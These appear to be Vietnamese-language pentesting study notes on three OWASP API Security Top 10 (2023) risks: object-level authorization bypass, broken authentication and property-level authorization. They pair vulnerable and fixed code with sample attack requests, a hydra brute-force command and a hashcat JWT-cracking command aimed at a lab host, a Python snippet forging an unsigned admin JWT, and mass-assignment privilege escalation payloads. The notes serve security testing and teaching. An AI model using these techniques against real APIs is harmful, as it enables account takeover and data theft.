# OWASP API Security Top 10 — Notes

## 📚 Mục lục

- [API1:2023 — Broken Object Level Authorization (BOLA)](#api12023--broken-object-level-authorization-bola)
  - [Khái niệm](#khái-niệm)
  - [Tại sao bị lỗi?](#tại-sao-bị-lỗi)
  - [Các loại Object ID thường gặp](#các-loại-object-id-thường-gặp)
  - [Các cách khai thác](#các-cách-khai-thác)
  - [Checklist khi test](#checklist-khi-test)
- [API2:2023 — Broken Authentication](#api22023--broken-authentication)
  - [Khái niệm](#khái-niệm-1)
  - [Tại sao bị lỗi?](#tại-sao-bị-lỗi-1)
  - [Các cách khai thác](#các-cách-khai-thác-1)
  - [Checklist khi test](#checklist-khi-test-1)
- [API3:2023 — Broken Object Property Level Authorization (BOPLA)](#api32023--broken-object-property-level-authorization-bopla)
  - [Khái niệm](#khái-niệm-2)
  - [Tại sao bị lỗi?](#tại-sao-bị-lỗi-2)
  - [Các cách khai thác](#các-cách-khai-thác-2)
  - [Checklist khi test](#checklist-khi-test-2)

---

# API1:2023 — Broken Object Level Authorization (BOLA)

## Khái niệm

BOLA còn được gọi là **IDOR (Insecure Direct Object Reference)** — hai tên khác nhau nhưng cùng một bản chất.

Lỗi xảy ra khi server **tin tưởng hoàn toàn vào cái ID mà client gửi lên** mà không thèm kiểm tra xem "thằng đang gửi request này có phải chủ sở hữu của cái ID đó không".

**Ví dụ thực tế:**
Bạn đăng nhập vào app ngân hàng, URL hiện ra:
```
GET /api/accounts/1001/balance
```
Bạn thử đổi `1001` thành `1002` — nếu server trả về số dư của tài khoản người khác thay vì báo lỗi 403, đó chính là BOLA.

**Điểm mấu chốt:**
Server có 2 bước kiểm tra:
- Bước 1 — **Authentication**: Mày là ai? Đã đăng nhập chưa? ✅ Server làm tốt
- Bước 2 — **Authorization**: Cái ID mày đang hỏi có phải của mày không? ❌ Server bỏ qua

Vì bỏ qua bước 2 nên chỉ cần có tài khoản hợp lệ là có thể xem data của bất kỳ ai.

> **CWE liên quan:** CWE-639 — Authorization Bypass Through User-Controlled Key

---

## Tại sao bị lỗi?

Server nhận ID từ request → query thẳng vào DB → trả về data mà **không verify xem ID đó có thuộc về user đang request không**.

```python
# ❌ Vulnerable — chỉ check đăng nhập, không check ownership
@app.get("/api/orders/{order_id}")
def get_order(order_id: int):
    return db.query(Order).filter(Order.id == order_id).first()

# ✅ Fixed — check thêm order này có phải của user hiện tại không
@app.get("/api/orders/{order_id}")
def get_order(order_id: int, current_user = Depends(get_current_user)):
    order = db.query(Order).filter(Order.id == order_id).first()
    if order.user_id != current_user.id:
        raise HTTPException(403)
    return order
```

---

## Các loại Object ID thường gặp

| Loại | Ví dụ | Ghi chú |
|------|-------|---------|
| Sequential integer | `/users/1`, `/users/2` | Dễ đoán nhất |
| UUID | `/docs/550e8400-e29b-41d4-a716-446655440000` | Khó đoán nhưng không phải fix |
| Slug | `/profile/john_doe` | Tìm qua trang public |
| Encoded | `/file/dXNlcjEyMw==` | Decode base64 là ra |
| Indirect | `/me/orders` nhưng body chứa `user_id` | Ẩn trong body |

> UUID trông có vẻ an toàn vì khó đoán, nhưng nếu server không check ownership thì chỉ cần leak UUID ra là xong — UUID không phải là giải pháp bảo mật.

---

## Các cách khai thác

### 1. ID Enumeration — Đổi số thứ tự
Đơn giản nhất: thấy ID dạng số thì tăng/giảm lên xem có lấy được data của người khác không.
```http
GET /api/users/100/profile HTTP/1.1
GET /api/users/101/profile HTTP/1.1
GET /api/users/102/profile HTTP/1.1
```
Dùng Burp Intruder hoặc ffuf để tự động fuzz cả dải số.

---

### 2. ID Swap trong Body / Parameter
Không chỉ trên URL — ID có thể nằm trong request body hoặc query string.
```http
# Request gốc của mình
POST /api/transfer HTTP/1.1
{"from_account": "ACC-001", "to_account": "ACC-999", "amount": 100}

# Đổi from_account thành account của victim
{"from_account": "ACC-002", "to_account": "ACC-999", "amount": 100}
```

---

### 3. HTTP Method Tampering
Server chỉ check quyền trên GET nhưng quên check trên DELETE/PUT.
```http
# Dùng token của user thường để xóa post của người khác
DELETE /api/posts/55 HTTP/1.1
Authorization: Bearer <token_of_normal_user>
```

---

### 4. Nested Resource — Đổi ID của resource cha
Thay ID ở cấp cha để leo sang data của user khác.
```http
GET /api/users/99/documents HTTP/1.1
GET /api/teams/5/members HTTP/1.1
```

---

### 5. Mass Assignment / Hidden Field
Server dùng `user_id` từ body thay vì lấy từ JWT.
```http
PATCH /api/profile HTTP/1.1
{"username": "me", "user_id": 42}   ← inject user_id của victim
```

---

### 6. Export / Download Endpoint
Các endpoint export thường bị bỏ sót authz check vì dev hay quên.
```http
GET /api/reports/export?report_id=789
GET /api/invoices/download/456
```

---

### 7. GraphQL — Query với ID tùy ý
```graphql
query {
  user(id: "victim_id") {
    email
    phone
    address
  }
}
```

---

### 8. Pivot từ ID lộ trong Response
Response trả về ID của object liên quan → dùng ID đó để tấn công endpoint khác.
```json
{"order_id": 1001, "user_id": 55, "invoice_id": 3021}
```
Lấy `invoice_id: 3021` → thử `GET /api/invoices/3021` bằng token của mình.

---

## Checklist khi test

- [ ] Tạo 2 account (A và B), lấy ID của object thuộc B, dùng token A để truy cập
- [ ] Fuzz tất cả numeric/UUID parameter trong path, query string, body, header
- [ ] Test cả GET / POST / PUT / PATCH / DELETE
- [ ] Kiểm tra endpoint export, download, preview
- [ ] Kiểm tra nested resource (`/users/{id}/...`)
- [ ] Kiểm tra GraphQL introspection + query với ID tùy ý
- [ ] Decode base64/JWT để tìm hidden ID field

---

# API2:2023 — Broken Authentication

## Khái niệm

Broken Authentication xảy ra khi **cơ chế xác thực của API bị triển khai sai hoặc thiếu sót**, khiến attacker có thể chiếm tài khoản hoặc bypass hoàn toàn bước đăng nhập.

**Ví dụ thực tế:**
Bạn quên mật khẩu, app gửi mã OTP 6 số về điện thoại. Nếu API xác thực OTP không giới hạn số lần thử, attacker chỉ cần viết script thử từ `000000` đến `999999` — chỉ có 1 triệu khả năng, máy tính thử hết trong vài phút.

**Điểm mấu chốt:**
Hệ thống xác thực bị "vỡ" khi:
- Cho phép thử mật khẩu / OTP không giới hạn số lần → **Brute force**
- Token JWT bị làm giả được → **Token manipulation**
- Endpoint nhạy cảm không cần token vẫn truy cập được → **Missing auth**

> **CWE liên quan:** CWE-307 — Improper Restriction of Excessive Authentication Attempts

---

## Tại sao bị lỗi?

| Nguyên nhân | Hậu quả |
|-------------|---------|
| Không có rate limiting | Brute force mật khẩu / OTP thoải mái |
| JWT secret yếu hoặc `alg: none` | Tự tạo token giả với role admin |
| Endpoint không verify token | Gọi thẳng không cần đăng nhập |
| Token không có expiry | Token cũ dùng mãi mãi |
| Reset token predictable | Đoán được link reset password |
| Token lộ trong URL | Bị lưu vào server log, browser history |

---

## Các cách khai thác

### 1. Brute Force / Credential Stuffing
Không có rate limit → thử mật khẩu thoải mái.
```http
POST /api/login HTTP/1.1
{"username": "admin", "password": "password123"}
```
```bash
# [ATTACKER]
hydra -L users.txt -P passwords.txt target.lab http-post-form \
  "/api/login:username=^USER^&password=^PASS^:Invalid credentials"
```

---

### 2. JWT `alg: none` — Tạo Token Không Cần Ký
Một số server chấp nhận JWT với `alg: none`, tức là không cần signature → tự tạo token với role admin.
```python
import base64, json

header  = base64.urlsafe_b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).rstrip(b"=")
payload = base64.urlsafe_b64encode(json.dumps({"user_id":1,"role":"admin"}).encode()).rstrip(b"=")
token   = f"{header.decode()}.{payload.decode()}."  # signature để trống
```

---

### 3. JWT Weak Secret — Crack Chữ Ký
Server dùng secret yếu như `secret`, `123456` → crack được → tự ký token tùy ý.
```bash
# [ATTACKER]
hashcat -a 0 -m 16500 <jwt_token> /usr/share/wordlists/rockyou.txt
```

---

### 4. JWT RS256 → HS256 Confusion
Server dùng RS256 (cặp public/private key). Nếu server không validate `alg`:
```
1. Lấy public key của server (thường public)
2. Đổi alg trong header từ RS256 → HS256
3. Ký token bằng public key như HMAC secret
→ Server verify bằng public key → pass!
```

---

### 5. OTP / 2FA Brute Force
OTP 6 số = 1 triệu khả năng. Không có rate limit → enumerate hết.
```http
POST /api/verify-otp HTTP/1.1
{"otp": "000000"}
{"otp": "000001"}
...
```

---

### 6. Token Leak qua URL
Token trong query string → bị lưu vào server log, browser history, Referer header.
```http
GET /api/user/profile?token=eyJhbGc... HTTP/1.1
```

---

### 7. Missing Authentication trên Sensitive Endpoint
Dev quên gắn middleware xác thực vào một số endpoint.
```http
GET /api/admin/users HTTP/1.1
→ 200 OK (không cần token!)
```

---

### 8. Password Reset Token Predictable / Reusable
Token reset dạng timestamp hoặc sequential → đoán được. Hoặc token không expire → dùng lại mãi.
```http
GET /api/reset?token=1720000001
GET /api/reset?token=1720000002
```

---

### 9. OAuth Misconfiguration
```
- redirect_uri không validate → token bị redirect về server của attacker
- Không có state parameter → CSRF trên OAuth flow
- Implicit flow → token lộ trong URL fragment
```

---

## Checklist khi test

- [ ] Test brute force login — có rate limit / lockout không?
- [ ] Decode JWT, kiểm tra `alg`, thử đổi sang `none`
- [ ] Brute force JWT secret bằng hashcat / john
- [ ] Thử đổi `alg` từ RS256 → HS256 với public key
- [ ] Brute force OTP — có rate limit không?
- [ ] Kiểm tra token có nằm trong URL / log không
- [ ] Gọi sensitive endpoint không kèm token → có trả 401 không?
- [ ] Kiểm tra token expiry — token cũ còn dùng được không?
- [ ] Kiểm tra password reset token — có predictable / reusable không?
- [ ] Kiểm tra OAuth `redirect_uri` validation và `state` parameter

---

# API3:2023 — Broken Object Property Level Authorization (BOPLA)

## Khái niệm

BOPLA là sự kết hợp của 2 vấn đề cũ:
- **Excessive Data Exposure** — Server trả về quá nhiều field, để client tự ẩn đi
- **Mass Assignment** — Server nhận field từ client rồi gán thẳng vào DB không lọc

Nếu BOLA là "truy cập sai object" thì BOPLA là **"đúng object nhưng đọc/ghi sai field"**.

**Ví dụ Excessive Data Exposure:**
Bạn là tài xế gọi xe, app gọi API lấy thông tin khách hàng để hiển thị tên + số điện thoại. Nhưng server lười, trả về luôn cả `password_hash`, `credit_card`, `internal_notes` của khách. App chỉ hiển thị tên + SĐT lên màn hình, nhưng nếu bạn bật Burp lên xem raw response thì thấy hết.

**Ví dụ Mass Assignment:**
Bạn update profile, gửi lên `{"username": "alice"}`. Bạn thử thêm `"role": "admin"` vào body. Nếu server bind toàn bộ body vào DB model mà không lọc → bạn vừa tự phong mình làm admin.

---

## Tại sao bị lỗi?

| Nguyên nhân | Mô tả |
|-------------|-------|
| Serialize toàn bộ DB model | Trả về raw model thay vì chỉ trả field cần thiết |
| Không có input whitelist | Bind trực tiếp `request.body` vào ORM |
| Filter ở phía client | Server trả hết, app tự ẩn — nhưng Burp thấy tất cả |
| Framework auto-binding | Rails, Laravel bind field tự động nếu cấu hình sai |

```python
# ❌ Vulnerable — trả về toàn bộ model, kể cả password_hash, is_admin
@app.get("/api/users/me")
def get_me(current_user = Depends(get_current_user)):
    return current_user

# ✅ Fixed — dùng response_model để chỉ trả field được phép
class UserPublic(BaseModel):
    id: int
    username: str
    email: str

@app.get("/api/users/me", response_model=UserPublic)
def get_me(current_user = Depends(get_current_user)):
    return current_user
```

---

## Các cách khai thác

### 1. Excessive Data Exposure — Đọc Field Ẩn
UI chỉ hiển thị tên + email, nhưng raw JSON response chứa nhiều hơn thế.
```http
GET /api/users/me HTTP/1.1
Authorization: Bearer <token>
```
```json
{
  "id": 10,
  "username": "alice",
  "email": "alice@lab.local",
  "password_hash": "$2b$12$...",     ← không hiển thị trên UI nhưng có trong JSON
  "is_admin": false,
  "api_key": "sk-...",
  "internal_notes": "VIP customer"
}
```
Dùng Burp hoặc DevTools → tab Network → xem raw response.

---

### 2. Mass Assignment — Leo Quyền
Thêm field nhạy cảm vào body khi update profile.
```http
# Bình thường
PATCH /api/profile HTTP/1.1
{"username": "alice"}

# Thêm field nhạy cảm
PATCH /api/profile HTTP/1.1
{"username": "alice", "role": "admin", "is_verified": true, "credit": 99999}
```
Nếu server bind toàn bộ body vào model → các field này bị ghi vào DB.

---

### 3. Mass Assignment — Khi Đăng Ký
Thêm field privilege vào request đăng ký tài khoản.
```http
POST /api/register HTTP/1.1
{
  "username": "attacker",
  "password": "pass123",
  "email": "attacker@lab.local",
  "email_verified": true,
  "admin": true
}
```

---

### 4. PUT Endpoint — Dễ Bị Bỏ Sót Hơn PATCH
PUT thay thế toàn bộ object → dev hay quên filter field trên PUT.
```http
PUT /api/users/me HTTP/1.1
{
  "username": "alice",
  "email": "alice@lab.local",
  "role": "admin"
}
```

---

### 5. Nested Object Expose Data Nhạy Cảm
Không chỉ object chính — object lồng bên trong cũng có thể bị expose.
```http
GET /api/orders/1001 HTTP/1.1
```
```json
{
  "order_id": 1001,
  "user": {
    "id": 55,
    "username": "alice",
    "password_hash": "$2b$12$...",      ← nested object bị expose
    "internal_credit_score": 720
  }
}
```

---

### 6. GraphQL — Query Field Không Được Phép
GraphQL trả về bất kỳ field nào được query nếu không có field-level authorization.
```graphql
query {
  me {
    id
    username
    passwordHash
    isAdmin
    apiKey
    internalNotes
  }
}
```

---

### 7. JSON Merge Patch — Ghi Field Ẩn
```http
PATCH /api/profile HTTP/1.1
Content-Type: application/merge-patch+json
{
  "subscription_plan": "enterprise",
  "trial_expires": "2099-12-31"
}
```

---

## Checklist khi test

- [ ] Xem raw JSON response — có field nào không hiển thị trên UI không?
- [ ] Thêm field nhạy cảm vào PATCH/PUT/POST body: `role`, `is_admin`, `balance`, `verified`
- [ ] Test endpoint đăng ký — inject field privilege escalation
- [ ] Kiểm tra nested object trong response có expose data nhạy cảm không
- [ ] Dùng GraphQL introspection → query tất cả field có thể
- [ ] So sánh request body schema với DB model — field nào server nhận nhưng không document?
- [ ] Test PUT endpoint — thường ít được bảo vệ hơn PATCH
